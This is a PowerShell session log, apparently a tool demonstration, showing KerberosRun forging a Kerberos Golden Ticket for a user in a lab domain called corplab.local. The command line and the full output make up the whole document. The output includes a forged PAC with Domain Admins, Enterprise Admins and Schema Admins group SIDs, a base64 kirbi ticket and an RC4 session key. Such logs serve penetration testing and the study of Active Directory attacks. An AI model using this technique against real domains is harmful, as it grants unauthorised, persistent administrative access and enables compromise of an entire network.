```powershell
PS C:\Users> .\KerberosRun.exe --golden --rc4 [...] --domainsid  S-1-5-21-1977317821-1772133574-954835042 --user dev2null  --domain corplab.local --verbose      
   __           __
  / /_____ ____/ /  ___ _______  ___ ______ _____
 /  '_/ -_) __/ _ \/ -_) __/ _ \(_-</ __/ // / _ \
/_/\_\\__/_/ /_.__/\__/_/  \___/___/_/  \_,_/_//_/

  v1.0.0

[*] Building Golden Ticket ...
[*] Building PAC ...
[*] Decrypting Golden Ticket ...
       - AuthTime :  5/27/2020 8:40:06 AM +00:00
       - StartTime :  5/27/2020 8:40:06 AM +00:00
       - EndTime :  5/27/2020 6:40:06 PM +00:00
       - RenewTill :  6/3/2020 8:40:06 AM +00:00
       - CRealm :  corplab.local
       - CName :
          - Type :  NT_PRINCIPAL
          - Name :  dev2null
       - AuthorizationData :
          - Type :  AdIfRelevant
             - Type :  AdWin2kPac
                - Type :  AdWin2kPac
                - Version :  0
                - LogonInfo :
                   - PacType :
                   - DomainId :
                      - Revision :  1
                      - IdentifierAuthority :  NTAuthority
                      - SubAuthority :  21, 1977317821, 1772133574, 954835042
                      - SubAuthorityCount :  4
                   - ExtraIds :
                   - DomainSid :
                      - Attributes :  0
                      - Id :  954835042
                      - Value :  S-1-5-21-1977317821-1772133574-954835042
                   - ExtraSidCount :  0
                   - ExtraSids :
                   - GroupCount :  5
                   - GroupId :  513
                   - GroupIds :
                      - RelativeId :  513
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - RelativeId :  512
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - RelativeId :  520
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - RelativeId :  518
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - RelativeId :  519
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                   - GroupSid :  S-1-5-21-1977317821-1772133574-954835042-513
                   - GroupSids :
                      - Id :  513
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-513
                      - Id :  512
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-512
                      - Id :  520
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-520
                      - Id :  518
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-518
                      - Id :  519
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-519
                   - HomeDirectory :
                   - HomeDrive :
                   - KickOffTime :  1/1/0001 12:00:00 AM +00:00
                   - LastFailedILogon :  1/1/1601 8:00:00 PM +00:00
                   - LastSuccessfulILogon :  1/1/1601 8:00:00 PM +00:00
                   - LogoffTime :  1/1/0001 12:00:00 AM +00:00
                   - LogonCount :  0
                   - LogonScript :
                   - LogonTime :  5/27/2020 8:40:06 AM +00:00
                   - ProfilePath :
                   - PwdCanChangeTime :  1/1/0001 12:00:00 AM +00:00
                   - PwdLastChangeTime :  1/1/0001 12:00:00 AM +00:00
                   - PwdMustChangeTime :  1/1/0001 12:00:00 AM +00:00
                   - Reserved1 :  0, 0
                   - Reserved3 :  0
                   - ResourceDomainId :
                   - ResourceDomainSid :
                   - ResourceGroupCount :  0
                   - ResourceGroupIds :
                   - ResourceGroups :
                   - SubAuthStatus :  0
                   - UserAccountControl :  ADS_UF_LOCKOUT, ADS_UF_NORMAL_ACCOUNT
                   - UserDisplayName :
                   - UserFlags :  LOGON_EXTRA_SIDS
                   - UserId :  500
                   - UserName :  dev2null
                   - UserSessionKey :  00000000000000000000000000000000
                   - UserSid :  S-1-5-21-1977317821-1772133574-954835042-500
                   - DomainName :  CORPLAB.LOCAL
                   - ServerName :
                   - BadPasswordCount :  0
                   - FailedILogonCount :  0
                - ClientInformation :
                   - PacType :  CLIENT_NAME_TICKET_INFO
                   - ClientId :  5/27/2020 8:40:06 AM +00:00
                   - Name :  dev2null
                   - NameLength :  16
                - KdcSignature :
                   - PacType :  0
                   - RODCIdentifier :  0
                   - Signature :  2F0C2967859182C58980DD630162E402
                   - SignatureData :  [...]
                   - Type :  KERB_CHECKSUM_HMAC_MD5
                   - Validated :  False
                   - Validator :
                      - Validator :  PaForUserChecksum
                      - Validator :  2F0C2967859182C58980DD630162E402
                - ServerSignature :
                   - PacType :  0
                   - RODCIdentifier :  0
                   - Signature :  7630D328EFCF3CF5C33E89B541943405
                   - SignatureData :  [...]
                   - Type :  KERB_CHECKSUM_HMAC_MD5
                   - Validated :  False
                   - Validator :
                      - Validator :  PaForUserChecksum
                      - Validator :  7630D328EFCF3CF5C33E89B541943405
                - DecodingErrors :
                - HasRequiredFields :  True
       - CAddr :
       - Flags :  PreAuthenticated, Initial, Renewable, Forwardable
       - Key :
          - EType :  RC4_HMAC_NT
          - Value :  74BD7F0486EA08C51A3A8B2C2E0932EF
       - Transited :
          - Type :  0
          - Contents :
[*] Now you have a Golden Ticket!
[+] Golden Ticket Kirbi:
    - doIEkzCCBI+gAwIBBaEDAgEWooIDpTCCA6FhggOdMIIDmaADAgEFoQ8bDWNvcnBsYWIubG9jYWyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDWNvcnBsYWIubG9jYWyjggNbMIIDV6ADAgEXooIDTgSCA0rNykYDP5cVY8oxm58Ec1cedMZsO2kw3ZUpuVBvULe6TFULEn33nlh9pF5JeiakXuJCh/QEipxx+Dqtj2BrWmoJ0JmHWgO28ykT1jrFjC80Riua5ATWt59y0sSYnr8M66oVZb9sKbsco89xcES/stBHt8h1zODN6kq9p3TOw3bAiWPSrlkFMFiypCppZT09133aAoN2QaChguCAM9RWuR3avzlNv1oqZN8fdj9DsMCvDmefWK5hFjokj+dC1Ji1ApCt3EnZPfXKm0zmC7l7kDyLLMAwBOWXuH7AzUf84b7b9RaX32jxUCkI1+B8ubZJaaOBSZub1D37W4uShs6nuB1upZuzyjkmPZ331lrrLCfmvqH3LVoqkosJMc5bMMoekh2KSX811EP+hBJD9ARe42C/eN3lOdbwjX1YhBj1FrDj8ZycZUJ/SNsI5ph9fIiFiMehAzalRpsdJPIt0UrSIwNnBHBJ54b+HpvuNmejo4rf5Rc4TRSoWgCSb3AkyEvcJrJ87A0PK1w9IKvQaO7DIRONFiEjQM39xc+pUOesAFuCV4xQ78tU+khcvZxVhPXAoC1pTvEgkY/8fQCe+o3SX+m0g1vhjh+dgdMa50HVeYmCQn1njD4jhK0ZPH1dHaGOy1Umre1OoL+knGfwfLFJZrOf2kacQTwChn0HLDYGrrxqubWsuLAiZ3DnR4UV5+rVZ9o4Wij9aKzx0wk5au5StmTy3bHaNeifBm1uczQtOtzFdmRWh7SLR4CR+DcLQxz83/7ROr8BH3k3UqMvX1lPTSuhOZVMwMpvfQ/7UWFyRG8ONGygBhmdKtASds63pI3Z9ZXzTMM2EhYKzHcc1LNyYrCw+deaacHvPtHKpKdhqzUITQiCgVUBzrrNk7w03t8GsGWhEh0QMKfr54o5N3iW19aWFRzQyKMQfwtMYNTtV+cnxd8J0zkQ9r36bOJftDj2zY8kVFGaxkJZYOIKJ++2UEK4O/OWtuXiQbsnLDBkFRL+6iHy4RBPVdFk5DAptic8zz49uLd81FILLarBtNixBY7WlMD/hF2daPPVUsoqLeyB98WxYvzcU+c73LUt+eo7CpyDXzyZI75WGONVNERNSLtbZ373gDW/JF9LqaOB2TCB1qADAgEAooHOBIHLfYHIMIHFoIHCMIG/MIG8oBswGaADAgEXoRIEEHS9fwSG6gjFGjqLLC4JMu+hDxsNY29ycGxhYi5sb2NhbKIVMBOgAwIBAaEMMAobCGRldjJudWxsowcDBQBA4AAApREYDzIwMjAwNTI3MDg0MDA2WqYRGA8yMDIwMDUyNzE4NDAwNlqnERgPMjAyMDA2MDMwODQwMDZaqA8bDWNvcnBsYWIubG9jYWypIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDWNvcnBsYWIubG9jYWw=
[*] Ticket Info:
    * KRB_CRED
    * pvno :  5
    * Tickets :  Kerberos.NET.Entities.KrbTicket
    * Encrypted Data :
       - Timestamp :
       - USec :
       - SAddress :
       - RAddress :
       - Nonce :
       - Ticket Info :
          - Realm :  corplab.local
          - PName :
             - Type :  NT_PRINCIPAL
             - Name :  dev2null
          - Flags :  PreAuthenticated, Initial, Renewable, Forwardable
          - AuthTime :
          - StartTime :  5/27/2020 8:40:06 AM +00:00
          - EndTime :  5/27/2020 6:40:06 PM +00:00
          - RenewTill :  6/3/2020 8:40:06 AM +00:00
          - SRealm :  corplab.local
          - SName :
             - Type :  NT_SRV_INST
             - Name :  krbtgt
          - Key :
             - EType :  RC4_HMAC_NT
             - KeyValue :  74BD7F0486EA08C51A3A8B2C2E0932EF
[+] Done! Now enjoy your ticket.
```